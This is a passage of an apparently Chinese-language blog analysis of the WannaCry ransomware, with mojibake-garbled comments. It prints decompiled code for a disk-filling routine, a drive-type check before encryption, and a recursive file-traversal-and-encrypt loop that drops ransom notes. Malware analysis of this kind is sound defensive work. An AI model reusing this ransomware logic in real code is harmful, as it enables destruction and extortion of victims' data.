class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>Â *__cdeclÂ <span class="title">FillDisk</span><span class="params">(<span class="keyword">int</span>Â Num_3)</span>Â Â </span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">hGlobalÂ =Â (<span class="keyword">void</span>Â *)GetDriveTypeW(RootPathName);<span class="comment">//Â è·å–ç£ç›˜ç±»å‹Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hGlobalÂ ==Â (<span class="keyword">void</span>Â *)DRIVE_FIXEDÂ )Â Â Â Â Â Â Â Â Â <span class="comment">//Â å¦‚æœæ˜¯å›ºå®šç£ç›˜Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">hGlobalÂ =Â GlobalAlloc(<span class="number">0</span>,Â <span class="number">0xA00000</span>u);Â Â Â Â Â Â Â Â <span class="comment">//Â ç”³è¯·0xA00000å¤§å°çš„å›ºå®šç©ºé—´Â Â </span></span><br><span class="line"></span><br><span class="line">hGlobal_1Â =Â hGlobal;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hGlobalÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(hGlobal,Â <span class="number">0x55</span>u,Â <span class="number">0xA00000</span>u);Â Â Â Â Â Â Â Â <span class="comment">//Â å°†ç”³è¯·çš„ç©ºé—´å…¨éƒ¨åˆå§‹åŒ–ä¸º5Â Â </span></span><br><span class="line"></span><br><span class="line">FileNameÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;v12,Â <span class="number">0</span>,Â <span class="number">0x204</span>u);Â Â </span><br><span class="line"></span><br><span class="line">v13Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">DeleteRecycleFile(Num_3,Â &amp;FileName);Â Â Â Â Â Â <span class="comment">//Â åˆ é™¤$RECYCLEçš„hibsys.WNCRYTæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">hFileÂ =Â CreateFileW(&amp;FileName,Â GENERIC_WRITE,Â <span class="number">0</span>,Â <span class="number">0</span>,Â CREATE_ALWAYS,Â FILE_ATTRIBUTE_HIDDEN,Â <span class="number">0</span>);<span class="comment">//Â åœ¨$RECYCLEä¸‹åˆ›å»ºä¸€ä¸ªhibsys.WNCRYTÂ å±æ€§ä¸ºéšè—Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hFileÂ ==Â (HANDLE)<span class="number">-1</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">hGlobalÂ =Â GlobalFree(hGlobal_1);Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ›å»ºå¤±è´¥ç›´æ¥é‡Šæ”¾ç©ºé—´Â Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">MoveFileExW(&amp;FileName,Â <span class="number">0</span>,Â MOVEFILE_DELAY_UNTIL_REBOOT);<span class="comment">//Â åœ¨ç³»ç»Ÿä¸‹æ¬¡é‡æ–°å¯åŠ¨æ—¶æ­£å¼è¿›è¡Œç§»åŠ¨æ–‡ä»¶æ“ä½œÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !dword_1000DD8CÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">LABEL_6:Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â GetDiskFreeSpaceExW(Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–Dç›˜çš„å‰©ä½™ç©ºé—´çš„å¤§å°Â ç¡®ä¿ç©ºé—´è¶³å¤ŸÂ Â </span></span><br><span class="line"></span><br><span class="line">RootPathName,Â Â </span><br><span class="line"></span><br><span class="line">&amp;FreeBytesAvailableToCaller,Â Â </span><br><span class="line"></span><br><span class="line">&amp;TotalNumberOfBytes,Â Â </span><br><span class="line"></span><br><span class="line">&amp;TotalNumberOfFreeBytes)Â Â </span><br><span class="line"></span><br><span class="line">&amp;&amp;Â TotalNumberOfFreeBytes.QuadPartÂ &gt;Â <span class="number">0x40000000</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">indexÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â WriteFile(hFile,Â hGlobal_1,Â <span class="number">0xA00000</span>u,Â &amp;NumberOfBytesWritten,Â <span class="number">0</span>)Â )<span class="comment">//Â å°†0xA00000ä¸ªå­—èŠ‚çš„5å†™å…¥åˆ°hibsys.WNCRYTÂ Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">0xA</span>u);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â (<span class="keyword">unsigned</span>Â <span class="keyword">int</span>)++indexÂ &gt;=Â <span class="number">20</span>Â )<span class="comment">//Â å¾ªç¯å†™å…¥20æ¬¡Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">10000u</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !dword_1000DD8CÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_6;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å½“ç£ç›˜å‰©ä½™ç©ºé—´ä¸è¶³æ—¶è·³å‡ºå¾ªç¯Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">GlobalFree(hGlobal_1);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â é‡Šæ”¾ç”³è¯·çš„å†…å­˜Â Â </span></span><br><span class="line"></span><br><span class="line">FlushFileBuffers(hFile);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ·æ–°æ–‡ä»¶ç¼“å†²åŒºÂ Â </span></span><br><span class="line"></span><br><span class="line">CloseHandle(hFile);Â Â </span><br><span class="line"></span><br><span class="line">hGlobalÂ =Â (<span class="keyword">void</span>Â *)DeleteFileW(&amp;FileName);<span class="comment">//Â åˆ é™¤ä¸´æ—¶ç›®å½•æ–‡ä»¶å¤¹ä¸‹çš„hibsys.WNCRYTÂ Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â hGlobal;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•° ä¼šåœ¨ $RECYCLE ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º hibsys.WNCRYT çš„æ–‡ä»¶<br>å¹¶è®¾ç½®å±æ€§ä¸ºéšè—ï¼Œå¹¶å¾ªç¯å¾€è¿™ä¸ªæ–‡ä»¶å†™å…¥æ•°æ®ï¼ŒçŸ¥é“ç£ç›˜ç©ºé—´ä¸è¶³</p><p>åœ¨æˆ‘ä»¬çš„æµ‹è¯•ç¯å¢ƒä¸‹ï¼Œè¿™ä¸ªæ–‡ä»¶å·²ç»è¾¾åˆ°äº† 39ä¸ªG</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image19.png" class="" width="19"><h4 id="6-2-2-3-EncryptFile-åŠ å¯†ç£ç›˜ä¸Šçš„æ‰€æœ‰æ–‡ä»¶"><a href="#6-2-2-3-EncryptFile-åŠ å¯†ç£ç›˜ä¸Šçš„æ‰€æœ‰æ–‡ä»¶" class="headerlink" title="6.2.2.3 EncryptFile åŠ å¯†ç£ç›˜ä¸Šçš„æ‰€æœ‰æ–‡ä»¶"></a>6.2.2.3 EncryptFile åŠ å¯†ç£ç›˜ä¸Šçš„æ‰€æœ‰æ–‡ä»¶</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>Â (Â a3Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â æ¡ä»¶ä¸æˆç«‹Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">uDriveTypeÂ =Â GetDriveTypeW;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–ç£ç›˜ç±»å‹Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â GetDriveTypeW(DirectoryName)Â ==Â DRIVE_CDROMÂ )<span class="comment">//Â å¦‚æœæ˜¯CDé©±åŠ¨å™¨ç›´æ¥è¿”å›Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;Â Â </span><br><span class="line"></span><br><span class="line">InterlockedExchange(&amp;Target,Â Value);Â Â Â Â Â Â Â Â <span class="comment">//Â äº¤æ¢ä¸¤ä¸ªæ•°Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_12;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â InterlockedExchangeAdd(&amp;Target,Â <span class="number">0</span>)Â !=Â ValueÂ )<span class="comment">//Â ç”¨äºå¯¹ä¸€ä¸ª32ä½æ•°å€¼æ‰§è¡ŒåŠ æ³•çš„åŸå­æ“ä½œÂ Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v3Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â !GetDiskFreeSpaceExW(Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–Dç›˜çš„ç©ºä½™å®¹é‡Â å¦‚æœå¤±è´¥ç›´æ¥è¿”å›Â Â </span></span><br><span class="line"></span><br><span class="line">DirectoryName,Â Â </span><br><span class="line"></span><br><span class="line">&amp;FreeBytesAvailableToCaller,Â Â </span><br><span class="line"></span><br><span class="line">&amp;TotalNumberOfBytes,Â Â </span><br><span class="line"></span><br><span class="line">&amp;TotalNumberOfFreeBytes)Â Â </span><br><span class="line"></span><br><span class="line">||Â !TotalNumberOfBytes.QuadPartÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">1000u</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â ++v3Â &gt;=Â <span class="number">30</span>Â )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">uDriveTypeÂ =Â GetDriveTypeW;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â GetDriveTypeW(DirectoryName)Â !=Â DRIVE_CDROMÂ )<span class="comment">//Â è·å–ç£ç›˜ç±»å‹Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">LABEL_12:Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â uDriveType(DirectoryName)Â ==Â DRIVE_FIXEDÂ )<span class="comment">//Â å¦‚æœç£ç›˜ç±»å‹æ˜¯å›ºå®šç£ç›˜Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">lpPathÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;v11,Â <span class="number">0</span>,Â <span class="number">0x204</span>u);Â Â </span><br><span class="line"></span><br><span class="line">v12Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">GetRecyclePathOrTempPath(Value,Â &amp;lpPath);<span class="comment">//Â è·å–Cç›˜ä¸‹ä¸´æ—¶æ–‡ä»¶å’Œå›æ”¶ç«™è·¯å¾„Â Â </span></span><br><span class="line"></span><br><span class="line">GetFilePath((<span class="keyword">wchar_t</span>Â *)Path,Â &amp;lpPath);Â Â <span class="comment">//è·å–æ–‡ä»¶è·¯å¾„D:$RECYCLE0.WNCRYTÂ Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">LOWORD(v6)Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">CoreEncryptFun((<span class="keyword">const</span>Â <span class="keyword">wchar_t</span>Â *)Path,Â DirectoryName,Â <span class="number">1</span>);<span class="comment">//Â æ ¸å¿ƒå‡½æ•°Â åŠ å¯†æ“ä½œÂ Â </span></span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸»ä½“ä»æ˜¯åŠ å¯†æ–‡ä»¶ä¹‹å‰çš„é¢„å¤„ç†éƒ¨åˆ†ï¼Œæ¶‰åŠå…·ä½“çš„åŠ å¯†è¿‡ç¨‹è¦è¿›å…¥<br>CoreEncryptFun å‡½æ•°è¿›è¡Œåˆ†æã€‚</p><h3 id="6-2-3-ç¬¬ä¸‰å±‚"><a href="#6-2-3-ç¬¬ä¸‰å±‚" class="headerlink" title="6.2.3 ç¬¬ä¸‰å±‚"></a>6.2.3 ç¬¬ä¸‰å±‚</h3><p>TraverseAndEncryptFiles(v3,Â DirectoryName,Â (int)&amp;v15,Â -1,Â a3);//Â éå†æ‰€æœ‰æ–‡ä»¶Â å¹¶ä¸”åŠ å¯†Â </p><p>ç¬¬ä¸‰å±‚ä¸»è¦å°±æ˜¯é€’å½’è°ƒç”¨è¿™ä¸ªåŠ å¯†å‡½æ•°å¹¶å¯¹æ‰€æœ‰è¦åŠ å¯†æ–‡ä»¶è¿›è¡Œéå†ï¼Œä¸‹é¢æˆ‘ä»¬ç»§ç»­æ·±å…¥</p><h3 id="6-2-4-ç¬¬å››å±‚"><a href="#6-2-4-ç¬¬å››å±‚" class="headerlink" title="6.2.4 ç¬¬å››å±‚"></a>6.2.4 ç¬¬å››å±‚</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">FileKindÂ =Â FilterPostFix(FindFileData.cFileName);<span class="comment">//Â å¯¹åç¼€è¿›è¡Œè¿‡æ»¤Â è¿”å›å€¼ä¸º1è¯´æ˜æ˜¯exeæˆ–dllÂ 2è¯´æ˜æ˜¯æ–‡æœ¬æ–‡ä»¶æˆ–è€…å›¾ç‰‡Â Â </span></span><br><span class="line"></span><br><span class="line">v48Â =Â FileKind;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â FileKindÂ !=Â (<span class="keyword">wchar_t</span>Â *)<span class="number">6</span>Â Â Â <span class="comment">//Â å¦‚æœåç¼€ä¸º.WNCRYç›´æ¥è·³è¿‡Â Â </span></span><br><span class="line"></span><br><span class="line">&amp;&amp;Â FileKindÂ !=Â (<span class="keyword">wchar_t</span>Â *)<span class="number">1</span>Â Â Â <span class="comment">//Â å¦‚æœæ˜¯exeå’Œdllç›´æ¥è·³è¿‡éå†ä¸‹ä¸€ä¸ªæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">&amp;&amp;Â (FileKindÂ ||Â FindFileData.nFileSizeHighÂ &gt;Â <span class="number">0</span>Â ||Â FindFileData.nFileSizeLowÂ &gt;=Â <span class="number">0xC800000</span>)Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">wcsncpy(&amp;TaegetFileName,Â FindFileData.cFileName,Â <span class="number">0x103</span>u);<span class="comment">//Â å°†æ–‡ä»¶åæ‹·è´åˆ°ç›®æ ‡å†…å­˜Â Â </span></span><br><span class="line"></span><br><span class="line">wcsncpy(&amp;TargetFileFullPath,Â &amp;String,Â <span class="number">0x167</span>u);<span class="comment">//Â å°†å®Œæ•´è·¯å¾„æ‹·è´åˆ°ç›®æ ‡å†…å­˜Â Â </span></span><br><span class="line"></span><br><span class="line">dwFileSizeHighÂ =Â FindFileData.nFileSizeHigh;Â Â </span><br><span class="line"></span><br><span class="line">dwFileSizeLowÂ =Â FindFileData.nFileSizeLow;Â Â </span><br><span class="line"></span><br><span class="line">sub_10003760(&amp;v32,Â &amp;v36,Â v33,Â &amp;TargetFileFullPath);<span class="comment">//Â è¿™ä¸ªå‡½æ•°ä¼šæ“ä½œå®¹å™¨å°†å®¹å™¨çš„è®¡æ•°+1Â Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">hFileÂ =Â hFindFile;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â FindNextFileW(hFindFile,Â &amp;FindFileData)Â );<span class="comment">//Â æŸ¥æ‰¾ä¸‹ä¸€ä¸ªæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">FindClose(hFile);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>Â (Â iÂ =Â *(<span class="keyword">wchar_t</span>Â )v33;Â iÂ !=Â v33;Â iÂ =Â *(<span class="keyword">wchar_t</span>Â )iÂ )<span class="comment">//Â å¾ªç¯åŠ å¯†æ‰€æœ‰çš„æ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !EncryptAllFile(v5,Â iÂ +Â <span class="number">4</span>,Â <span class="number">1</span>)Â )Â Â Â Â Â Â <span class="comment">//Â åŠ å¯†æ‰€æœ‰æ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">sub_10003760((_DWORDÂ *)a3,Â &amp;v36,Â *(_DWORDÂ )(a3Â +Â <span class="number">4</span>),Â iÂ +Â <span class="number">4</span>);Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">v14Â =Â a4;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â a4Â ==Â <span class="number">-1</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v15Â =Â Format;Â Â </span><br><span class="line"></span><br><span class="line">v14Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â wcsnicmp(Format,Â asc_1000CC14,Â <span class="number">2u</span>)Â )Â Â </span><br><span class="line"></span><br><span class="line">v14Â =Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>Â Â </span><br><span class="line"></span><br><span class="line">v15Â =Â FormatÂ +Â <span class="number">2</span>;Â Â </span><br><span class="line"></span><br><span class="line">v16Â =Â *v15;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>Â (Â jÂ =Â v15;Â v16;Â ++jÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â v16Â ==Â <span class="number">92</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">++v14;Â Â </span><br><span class="line"></span><br><span class="line">v16Â =Â j[<span class="number">1</span>];Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â v14Â &lt;=Â <span class="number">6</span>Â &amp;&amp;Â v34Â &gt;Â <span class="number">0</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">CopyReadMeTxt(Format);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å°†@Please_Read_Me@.txtÂ æ‹·è´åˆ°Dç›˜ä¸‹Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â v14Â &gt;Â <span class="number">4</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">CopyWanaDecryptor_0(Format);Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å°†@WanaDecryptor@.exeæ‹·è´åˆ°Dç›˜Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>Â Â </span><br><span class="line"></span><br><span class="line">CopyWanaDecryptor(Format);Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å°†@WanaDecryptor@.exeæ‹·è´åˆ°Dç›˜Â Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">v18Â =Â v30;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â a5Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v19Â =Â *(_DWORDÂ )v30;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â *(<span class="keyword">void</span>Â )v30Â !=Â v30Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v20Â =Â v14Â +Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">v21Â =Â (<span class="keyword">wchar_t</span>Â *)v19[<span class="number">3</span>];Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !v21Â )Â Â </span><br><span class="line"></span><br><span class="line">v21Â =Â (<span class="keyword">wchar_t</span>Â *)`<span class="built_in">std</span>::basic_string&lt;<span class="keyword">unsigned</span>Â <span class="keyword">short</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">unsigned</span>Â <span class="keyword">short</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">unsigned</span>Â <span class="keyword">short</span>&gt;&gt;::_Nullstr<span class="number">&#x27;</span>::`<span class="number">2&#x27;</span>::_C;Â Â </span><br><span class="line"></span><br><span class="line">TraverseAndEncryptFiles((_DWORDÂ *)v35,Â v21,Â a3,Â v20,Â a5);<span class="comment">//Â é€’å½’éå†æ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">v19Â =Â (_DWORDÂ *)*v19;Â Â </span><br><span class="line"></span><br><span class="line">v18Â =Â v30;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â v19Â !=Â v30Â );Â Â </span><br><span class="line"></span><br><span 